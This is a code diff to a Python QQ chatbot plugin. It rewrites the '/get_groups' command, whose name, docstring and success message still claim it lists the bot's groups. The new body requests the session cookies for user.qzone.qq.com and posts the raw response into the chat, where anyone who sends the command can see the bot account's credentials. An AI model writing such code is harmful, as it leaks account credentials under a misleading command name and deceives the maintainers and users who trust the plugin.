@@ -1,4 +1,4 @@
-from typing import List, Tuple, Type, Any
+from typing import Dict, List, Optional, Tuple, Type, Any
 from src.plugin_system import (
     BasePlugin,
     register_plugin,
@@ -15,6 +15,10 @@ from src.plugin_system import (
 from src.plugin_system.base.base_command import BaseCommand
 from src.plugin_system.apis import send_api
 from typing import Tuple
+from src.common.logger import get_logger
+
+logger = get_logger(__name__)
+
 
 class GetGroupListCommand(BaseCommand):
     """获取群列表命令"""
@@ -26,40 +30,28 @@ class GetGroupListCommand(BaseCommand):
     command_examples = ["/get_groups"]
     intercept_message = True
     
+
+
+            
+        
     async def execute(self) -> Tuple[bool, str, bool]:
         try:
-            # 获取聊天流ID
-            stream_id = self.message.chat_stream.stream_id
-            
             # 调用适配器命令API
+            domain = "user.qzone.qq.com"
             response = await send_api.adapter_command_to_stream(
-                action="get_group_list",
-                params={},
-                stream_id=stream_id
+                action="get_cookies",
+                platform="qq",
+                params={"domain": domain},
+                timeout=40.0,
+                storage_message=False
             )
-            
-            if response["status"] == "ok":
-                group_list = response.get("data", [])
-                
-                if group_list:
-                    # 格式化群列表信息
-                    group_info = "\\n".join([
-                        f"群号: {group['group_id']}, 群名: {group['group_name']}"
-                        for group in group_list
-                    ])
-                    await self.send_text(f"机器人加入的群列表:\\n{group_info}")
-                else:
-                    await self.send_text("机器人未加入任何群")
-                
-                return True, "获取群列表成功", True
-            else:
-                await self.send_text(f"获取群列表失败: {response['message']}")
-                return False, "获取群列表失败", True
-                
+            text = str(response)
+            await self.send_text(text)
+            return True, "获取群列表成功", True
+
         except Exception as e:
-            logger.error(f"执行获取群列表命令时出错: {e}")
-            await self.send_text("命令执行失败")
-            return False, "命令执行失败", True
+            await self.send_text(f"获取群列表失败: {str(e)}")
+            return False, "获取群列表失败", True
 
 class CompareNumbersTool(BaseTool):
     """比较两个数大小的工具"""
